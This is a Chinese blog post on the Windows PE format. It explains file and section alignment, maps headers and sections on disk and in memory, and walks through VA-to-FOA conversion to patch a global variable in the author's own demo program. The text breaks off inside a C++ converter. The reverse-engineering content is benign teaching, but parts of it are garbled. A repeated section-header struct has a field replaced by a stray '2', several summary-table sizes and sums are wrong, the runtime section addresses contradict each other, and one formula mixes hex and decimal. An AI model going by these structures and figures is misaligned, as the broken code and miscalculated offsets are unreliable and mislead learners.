<p>自DOS头开始至块表结束，<code>头大小和为0x248</code>，此处想要拿到SizeOfHeaders成员的值，需要了解<code>文件对齐</code>的概念并对其进行对齐处理。</p>
<p><strong>什么是文件对齐？</strong></p>
<p>文件对齐的标准通过扩展PE头中定义的<code>FileAlignment(DWORD类型 占4字节)</code></p>
<p>文件对齐的要求就是SizeOfHeaders必须为FileAlignment的<code>整数倍</code></p>
<p>通过以上概念，我们可以理解，由于扩展PE头FileAlignment成员的限制，要求SizeOfHeaders必须为它的整数倍（不足则填充）；要想知道文件对齐的标准是多少，我们需要拿到FileAlignment的值</p>
<p>由于前面已知扩展PE头开始地址为:0xE0</p>
<p>FileAlignment(DWORD 4字节)地址为:0xE0+36 = 0x104</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116164142391.png" alt="image-20211116164142391"></p>
<p>FileAlignment为 00 02 00 00 即为 0x200</p>
<p>前面拿到的头大小和为0x248，显然并不是0x200的整数倍</p>
<p>其整数倍，也就是SizeOfHeader的大小应为: (0x248/200+1)*200=400</p>
<p><strong>SizeOfHeaders大小</strong></p>
<p>再通过扩展PE头成员值的方式验证计算是否正确</p>
<p>先前拿到的FileAlignment地址为0x104，再往后24字节，便是SizeOfHeaders存放地址</p>
<p>0x104+24 = 0x11C</p>
<p>SizeOfHeaders：na</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116165632063.png" alt="image-20211116165632063"></p>
<p>拿到00 04 00 00 即 0x400,是FileAlignment的整数倍</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116164459021.png" alt="image-20211116164459021"></p>
<p>可以看到，块表与块之间的间隙自0x400结束</p>
<p><strong>为什么需要文件对齐？</strong></p>
<p>跟内存对齐一样，都是为了使执行时的效率更高，方便内存与磁盘进行交换数据更有效率。</p>
<p><strong>块结构</strong></p>
<p>块的起始地址由块表中的PointerToRawData决定，<code>第一个块</code>的起始地址则有上面的SizeofHeaders决定</p>
<p>块部分存储的是数据，如何存储由块表进行决定</p>
<p><strong>块表在C中的定义</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_SIZEOF_SHORT_NAME              8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfRawData;		<span class="comment">//块的大小</span></span><br><span class="line">    DWORD   PointerToRawData;	<span class="comment">//块在磁盘中的偏移</span></span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<p><strong>块的起始地址</strong></p>
<p>找到结构体中的PointerToRawData成员（DWORD类型占4个字节)</p>
<p>PointerToRawData的含义为<code>该块在磁盘文件中的偏移</code></p>
<p>前面拿到第一个块表的首地址0x210</p>
<p>从0x210开始往后找20字节，0x210+20=0x224,拿到PointerToRawData的地址，跳转过去拿到4字节的值(磁盘文件中的偏移)</p>
<p>00 04 00 00 即 0x400<img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116172542500.png" alt="image-20211116172542500"></p>
<p>与SizeOfHeaders得到的一致，前面说过，块的起始地址由块表中的PointerToRawData决定，而第一个块的首地址由SizeOfHeaders决定，此处一致，验证了上文的说法。</p>
<p><strong>块的大小</strong></p>
<p>SizeOfRawData为块的大小(文件对齐后)</p>
<p>SizeOfRawData（Dword 4字节）就在PointerToRawData前面</p>
<p>所以其在块表中的地址为PointerToRawData-4=0x224-4=0x220</p>
<p>SizeOfRawData:</p>
<p>00 72 09 00 即为 0x97200</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116173302128.png" alt="image-20211116173302128"></p>
<p>块的大小与前面三个头(DOS+PE+块表)的大小一样，都需要满足文件对齐</p>
<p>先前拿到的FileAlignment为0x200 块的大小SizeOfRawData大小为0x97200满足整数倍条件，满足文件对齐。</p>
<p><strong>块的结束地址（下一个块的起始地址)</strong></p>
<p>块的结束地址为 块的起始地址+块的大小</p>
<p>即 0x400+0x97200 = 0x97600</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116173621872.png" alt="image-20211116173621872"></p>
<p>可以看到，第一个块与第二个块之间<code>存在空隙</code>,这段空隙是由于在文件中补足文件对齐产生的。</p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>在非运行态下:</p>
<ul>
<li>DOS首部和PE文件头与块表连续存储，中间没有空隙</li>
<li>块表与块之间存在<code>文件对齐</code>的影响，可能会存在间隙</li>
<li>块与块之间也可能由于<code>文件对其</code>的影响产生间隙</li>
</ul>
<p><strong>相关数据结构成员</strong></p>
<table>
<thead>
<tr>
<th>数据结构成员</th>
<th>所属数据结构</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>SizeOfHeaders</td>
<td>扩展PE头</td>
<td>头大小（文件对齐后）</td>
</tr>
<tr>
<td>FileAlignment</td>
<td>扩展PE头</td>
<td>文件对齐</td>
</tr>
<tr>
<td>PointerToRawData</td>
<td>块表</td>
<td>第一个块表的PointerToRawData由SizeOfHeaders决定，后面块表的PointerToRawData由前一个块表的PointerToRawData+SizeOfRawData决定</td>
</tr>
<tr>
<td>SizeOfRawData</td>
<td>块表</td>
<td>块表的大小（文件对齐后）</td>
</tr>
</tbody></table>
<p><strong>记录下各个结构的起始以及结束位置方便接下来与运行态比较</strong></p>
<table>
<thead>
<tr>
<th>结构</th>
<th>起始地址</th>
<th>结束地址</th>
<th>大小</th>
</tr>
</thead>
<tbody><tr>
<td>DOS部首</td>
<td>0</td>
<td>118</td>
<td>0x118=280</td>
</tr>
<tr>
<td>PE文件头</td>
<td>118</td>
<td>210</td>
<td>0xF8=248=4+20+224</td>
</tr>
<tr>
<td>块表</td>
<td>210</td>
<td>300</td>
<td>0xF0=240=6*40</td>
</tr>
<tr>
<td>前三个结构</td>
<td>0</td>
<td>400</td>
<td>0x400（文件对齐后）</td>
</tr>
<tr>
<td>第一个块</td>
<td>400</td>
<td>97600</td>
<td>0x97200（文件对齐后）</td>
</tr>
</tbody></table>
<h4 id="运行态"><a href="#运行态" class="headerlink" title="运行态"></a>运行态</h4><p>运行态，指PE文件装载入内存时，PE结构文件的状态</p>
<p><strong>加载运行态PE文件</strong></p>
<p>1.启动PE文件</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116192050095.png" alt="image-20211116192050095"></p>
<p>2.使用16进制编辑器 工具-&gt;打开主内存-&gt;选定PE程序</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116192222818.png" alt="image-20211116192222818"></p>
<p><strong>分析运行态的PE文件</strong></p>
<p>此时Dos头的偏移起始地址为00820000,结束地址为008200F0</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116192334866.png" alt="image-20211116192334866"></p>
<p>跟进偏移，到达PE头标志起始地址008200F0,可见头标志起始地址和标准PE头 </p>
<p><strong>PE头标志和标准头</strong></p>
<p>起始为008200F0 </p>
<p>结束为00820108</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116193032725.png" alt="image-20211116193032725"></p>
<p>紧随其后，便是扩展PE头，占据224字节单位</p>
<p>起始:00820108</p>
<p>结束:008201E8</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116193755733.png" alt="image-20211116193755733"></p>
<p><strong>块表</strong></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116194147123.png" alt="image-20211116194147123"></p>
<p>块表起始位置:008201E8</p>
<p>块表结束位置:008202AF</p>
<p><strong>块表后的空隙</strong></p>
<p>根据前面的信息来看，在块表前的结构在运行态以及废运行态出了起始地址不同之外，其他的并无不同</p>
<p>在内存中，块表与块的间隙大小与文件对齐FileAlignment无关，是由<code>内存对齐</code>所决定的，内存对齐的机制与文件对齐类似，都是需为SectionAlignment所规定的的值的整数倍。</p>
<p>内存对齐的属性是由<code>_IMAGE_OPTIONAL_HEADER</code>构造体中的成员<code>SectionAlignment</code>决定的，同时，此成员其实就在<code>FileAlignment</code>(文件对齐)成员的上面</p>
<p>扩展PE头在c中的定义</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    DWORD   ImageBase;</span><br><span class="line">    DWORD   SectionAlignment;                        <span class="comment">//&lt;--- 内存对齐</span></span><br><span class="line">    DWORD   FileAlignment;                                <span class="comment">//&lt;--- 文件对齐</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    DWORD   SizeOfHeaders;                                <span class="comment">//&lt;--- 决定块的起始位置</span></span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>

<p>利用扩展PE头中的SectionAlignment值验证理论是否正确：</p>
<p>从扩展PE头首地址00820108开始数32（1word 2bytes 7dword =1 + 2 + 28）个字节，到820128处，拿到SectionAlignment值</p>
<p>00 10 00 00 即 0x1000</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116195441400.png" alt="image-20211116195441400"></p>
<p>即内存对齐的基数为0x1000</p>
<p>同时，在内存中的PE文件块结构，头地址与SizeofHeaders值无关，因为SizeOfHeaders是文件对齐(FileAlignMent)专用</p>
<p><strong>块</strong></p>
<p>在非运行态中，块的起始位置由PointerToRawData决定，且PointerToRawData必须为FileAlignment的整数倍</p>
<p>但在运行态中，块的起始位置则并不由PointerToRawData决定，PointerToRawData和SizeOfHeaders一样都为文件对齐专用</p>
<p>运行态块存储涉及点较多，此处只对第一个块的起始地址，结束地址以及大小做计算</p>
<p><strong>块的起始地址</strong></p>
<p>第一个块的起始地址，取决于(DOS头+PE头+块表)总大小的和进行内存对齐后的结果。</p>
<p>三大头加起来的地址为8202AF为止，根据SectionAlignment的值1000h计算，需要进行补齐操作，补齐至821000达到1000的整数倍</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116200746213.png" alt="image-20211116200746213"></p>
<p>可以看到第一个块的首地址已经发现:</p>
<p>首地址:821000</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116200958454.png" alt="image-20211116200958454"></p>
<p>块表的结束地址=块表首地址+块大小，而块大小通过块表当中的SizeOfRawData可以拿到，此处再放出c中的块表定义</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_SIZEOF_SHORT_NAME              8</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line"><span class="number">2</span></span><br><span class="line">    DWORD   PointerToRawData;                <span class="comment">//&lt;--- 块在磁盘文件中的偏移</span></span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<p>根据块表定义可以发现，<code>SizeOfRawData</code>在块表中可以通过块表首地址+16字节(8x1bytes + 2DWORD ) =  8201E8 + 16 = 8201F8</p>
<p>拿到SizeOfRawData大小 00 92 19 00 即 199200</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116202106848.png" alt="image-20211116202106848"></p>
<p>由此可知结束地址：821000 + 199200 = 9BA200 + E00（补0内存对齐1000）</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116203313553.png" alt="image-20211116203313553"></p>
<p><strong>拿到块大小第二种方法</strong></p>
<p>块的大小=块的结束地址-块的起始地址=0x59B000-0x401000=0x19A000（满足内存对齐）</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116203344335.png" alt="image-20211116203344335"></p>
<p><strong>运行态时，块的大小满足内存对齐，而非先前的文件对齐</strong></p>
<h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>在运行态中:</p>
<ul>
<li>DOS头、PE文件头、块表连续存储，中间没有空隙</li>
<li>运行态中，块表与块之间存储可能会有空隙</li>
<li>空隙的大小与SectionAlignMent有关，而非FileAlignMent</li>
<li>块与块之间也有可能会因<code>内存对齐</code>而产生空隙</li>
</ul>
<p>相关数据结构成员：</p>
<table>
<thead>
<tr>
<th>数据结构成员</th>
<th>所属数据结构</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>SectionAlignment</td>
<td>扩展PE头</td>
<td>内存对齐</td>
</tr>
</tbody></table>
<p>各结构的起始和结束位置：</p>
<table>
<thead>
<tr>
<th>结构</th>
<th>起始地址</th>
<th>结束地址</th>
<th>大小</th>
</tr>
</thead>
<tbody><tr>
<td>DOS部首</td>
<td>00820000</td>
<td>008200F0</td>
<td>0xF0=240</td>
</tr>
<tr>
<td>PE文件头</td>
<td>008200F0</td>
<td>00820108</td>
<td>0xF8=244=224+40</td>
</tr>
<tr>
<td>块表</td>
<td>008201E8</td>
<td>008202AF</td>
<td>0x1E8=200=7*40</td>
</tr>
<tr>
<td>前三个结构</td>
<td>00820000</td>
<td>00821000</td>
<td>0x1000（内存对齐后）</td>
</tr>
<tr>
<td>第一个块</td>
<td>00821000</td>
<td>0x19A000</td>
<td>0x19A000（内存对齐后）</td>
</tr>
</tbody></table>
<h4 id="运行态与非运行态相同点"><a href="#运行态与非运行态相同点" class="headerlink" title="运行态与非运行态相同点"></a>运行态与非运行态相同点</h4><h5 id="相同"><a href="#相同" class="headerlink" title="相同"></a><strong>相同</strong></h5><p>无论是运行态，还是非运行态，DOS头、PE头、块表均为连续存储，中间没有填充间隙</p>
<p>第一个块表首地址都三个头的大小影响，紧随着对齐后的三个头</p>
<p>块与块之间也需要进行对齐</p>
<h5 id="不同"><a href="#不同" class="headerlink" title="不同"></a>不同</h5><p>运行态与非运行态的起始地址不同</p>
<p>在非运行态中，块表与块之间、块与块之间的间隙由<code>文件对齐(FileAlignment)</code>产生</p>
<p>在运行态中，块表与块之间、块与块之间的间隙由<code>内存对齐(SectionAlignment)</code>产生</p>
<h5 id="非运行态与运行态映射图"><a href="#非运行态与运行态映射图" class="headerlink" title="非运行态与运行态映射图"></a>非运行态与运行态映射图</h5><p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116204836412.png" alt="image-20211116204836412"></p>
]]></content>
      <categories>
        <category>PE结构</category>
      </categories>
      <tags>
        <tag>PE结构</tag>
      </tags>
  </entry>
  <entry>
    <title>PE结构-VA与FOA的转化</title>
    <url>/2021/10/14/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96/</url>
    <content><![CDATA[<h3 id="VA转FOA"><a href="#VA转FOA" class="headerlink" title="VA转FOA"></a>VA转FOA</h3><p>相应名词概念</p>
<table>
<thead>
<tr>
<th></th>
<th>对应结构体成员</th>
<th>英文全称</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>VA</td>
<td>_IMAGE_SECTION_HEADER.VirtualAddress</td>
<td>Virtual Address</td>
<td>在内存中的虚拟地址</td>
</tr>
<tr>
<td>RVA</td>
<td>_IMAGE_SECTION_HEADER.VirtualAddress</td>
<td>Relative Virtual Address</td>
<td>相对虚拟地址</td>
</tr>
<tr>
<td>FOA</td>
<td>_IMAGE_SECTION_HEADER.PointerToRawData</td>
<td>File Offset Address</td>
<td>文件偏移地址</td>
</tr>
</tbody></table>
<span id="more"></span>

<h3 id="为什么需要学习VA与FOA之间的转换"><a href="#为什么需要学习VA与FOA之间的转换" class="headerlink" title="为什么需要学习VA与FOA之间的转换"></a>为什么需要学习VA与FOA之间的转换</h3><p>此处需要引入一个问题：<strong>如何改变一个全局变量的初始值</strong></p>
<ul>
<li>如果一个全局变量有<strong>初始值</strong>，那么他的初试值一定是存储于PE文件中的。</li>
<li>如果一个全局变量没有<strong>初始值</strong>，那么在PE文件中就没有存储它的位置，只有当PE文件加载到内存中时，才会给它分配空间</li>
</ul>
<p>修改程序的数据时，如果不懂的如何转换VA与FOA，我们在修改内存全局变量的时候就只能通过CE等辅助工具进行搜索修改了。</p>
<h3 id="全局变量初始值Demo"><a href="#全局变量初始值Demo" class="headerlink" title="全局变量初始值Demo"></a>全局变量初始值Demo</h3><p>利用c语言输出全局变量的值与地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> global = <span class="number">0x610</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//输出全局变量地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;address:%X\n&quot;</span>, &amp;global);</span><br><span class="line">    <span class="comment">//输出全局变量的值</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value:0x%X\n&quot;</span>, global);</span><br><span class="line">    <span class="comment">//暂停一下，防止窗口运行完自动关闭</span></span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014123921284.png" alt="image-20211014123921284"></p>
<p>可以看到程序将全局变量地址与值打印到了dos窗口之上</p>
<h3 id="修改全局变量的初始值"><a href="#修改全局变量的初始值" class="headerlink" title="修改全局变量的初始值"></a>修改全局变量的初始值</h3><p>注意，在调试的时候，要选择低版本windows 如windows 2008，高版本windows启用随机内存地址保护，不利于我们调试，一开始踩了这个大坑，又空耗了1个多小时….</p>
<p>此时我们可以看到在运行时，全局变量的地址为0A425A30</p>
<p>此时我们如果使用16进制编辑器去寻找这个地址，我们是无法发现全局变量的。</p>
<p>这是由于PE文件在载入内存中时的地址是虚拟地址（VA）</p>
<p>VA = ImageBase + RVA    </p>
<p>也就是说虚拟地址 = PE文件载入内存中后的基地址 + 相对虚拟地址（相对于基地址看齐）</p>
<p>而基地址是ImageBase字段的值，这点我们可以从PE头中获知</p>
<p>于是我们可以计算得出 RVA = VA - ImageBase</p>
<p>而其在PE文件中的地址为FOA（文件偏移地址）</p>
<p>最终问题就也就变成了 RVA与FOA的转换</p>
<p><strong>通俗点来讲，就是说假设我们通过运行程序拿到RVA，想要获知FOA，就需要通过一定手段利用RVA来获知FOA，从而定位到我们想要的一个函数或变量的地址</strong></p>
<h3 id="VA到FOA转换流程"><a href="#VA到FOA转换流程" class="headerlink" title="VA到FOA转换流程"></a>VA到FOA转换流程</h3><p>1.得到RVA的值： RVA = VA - ImageBase </p>
<p>2.判断RVA是否在PE文件头内</p>
<ul>
<li>如果在，则FOA=RVA</li>
<li>如果不在，判断RVA在哪个节（区块），差值 = RVA - 区块.virtualAddress(RVA),    FOA = 区块.PointerToRawData + 差值</li>
</ul>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014114852057.png" alt="image-20211014114852057"></p>
<h3 id="根据流程转换"><a href="#根据流程转换" class="headerlink" title="根据流程转换"></a>根据流程转换</h3><p><strong>1.拿到RVA的值： RVA = VA - ImageBase</strong></p>
<p>首先拿到ImageBase值</p>
<p>利用StudyPE来查看</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014124137197.png" alt="image-20211014124137197"></p>
<p>显然，ImageBase的值为00400000</p>
<p>于是可以算出 RVA = VA - ImageBase =  425a30h - 400000h = 25A30h</p>
<p><strong>2.判断RVA是否位于PE文件头之内</strong></p>
<p>可以看到PE文件头的地址在F7h处结尾，而25A30h远远大于，因此不在pe文件头处</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014125244591.png" alt="image-20211014125244591"></p>
<p>很显然，1F600已经超出了PE文件的最大范围，这证明我们定位的RVA ≠FOA</p>
<p>3.<strong>判断RVA属于那一节</strong></p>
<p>根据RVA &gt; = 区块.VirtualAddress </p>
<p>RVA &lt; 区块.VirtualAddress + 当前节内存对齐后</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">RVA&gt;=节.VirtualAddress</span><br><span class="line"></span><br><span class="line">RVA&lt;节.VirtualAddress + 当前节内存对齐后的大小=节.VirtualAddress +[(Max&#123;节.Misc，节.SizeOfRawData&#125;)÷SectionAlignment]向上取整×SectionAlignment</span><br></pre></td></tr></table></figure>

<ul>
<li>节.sizeOfRawData 是节文件对齐后的大小</li>
<li>节.Misc是节的实际大小</li>
</ul>
<p><strong>内存对齐后的大小 = [Max{实际的大小,文件对齐后的大小}÷内存对齐]向上取整×内存对齐</strong></p>
<p>向上取整的意思就是 如果除后的结果为整数就直接为结果，如果除后的结果带小数则取整然后加一</p>
<p>例子：[5÷2]向上取整= 2.5取整+1=2+1=3，[4÷2]向上取整=2</p>
<p>根据工具可知，RVA = 0X25A30 处于.idata区块之中 </p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014125443850.png" alt="image-20211014125443850"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014130005638.png" alt="image-20211014130005638"></p>
<p>程序在内存中的对齐基数为SectionAlign设置的0x1000</p>
<p>其实际大小 = 区块.Misc 在 StudyPE中显示为V.Size = 0x5604</p>
<p>Max{节.Misc,节.SizeofRawData} = Max{0x5604,0x4000} = 0x5604</p>
<p>内存对齐后的大小 = {0x5604 / 内存对齐} 向上取整*内存对齐 = (0x5604/0x1000)向上取整 * 0x1000 = (5 + 1 ) * 0x1000 = 0x6000</p>
<p>RVA&gt;=0x25000</p>
<p>RVA&lt;0X25000 + 内存对齐后的大小 = 0x25000 + 0x6000 = 0x2A000</p>
<p>差值 = RVA - 节.VirtualAddress = 0x25A30 - 0X25000 = 0XA30</p>
<p>PointerToRawData 在工具中显示为Offset，为0X25000</p>
<p>FOA = 节.PointerToRawData + 差值 = 0x25000 + 0XA30= 0x25A30</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014131006511.png" alt="image-20211014131006511"></p>
<p>由此，找到了数值地址，进行修改为65535,再次运行，发现值已被修改.</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014131136540.png" alt="image-20211014131136540"></p>
<h3 id="利用代码实现VA转FOA"><a href="#利用代码实现VA转FOA" class="headerlink" title="利用代码实现VA转FOA"></a>利用代码实现VA转FOA</h3><p><strong>代码</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PE.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">//在VC6这个比较旧的环境里，没有定义64位的这个宏，需要自己定义，在VS2019中无需自己定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AMD64  0x8664</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 32位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span 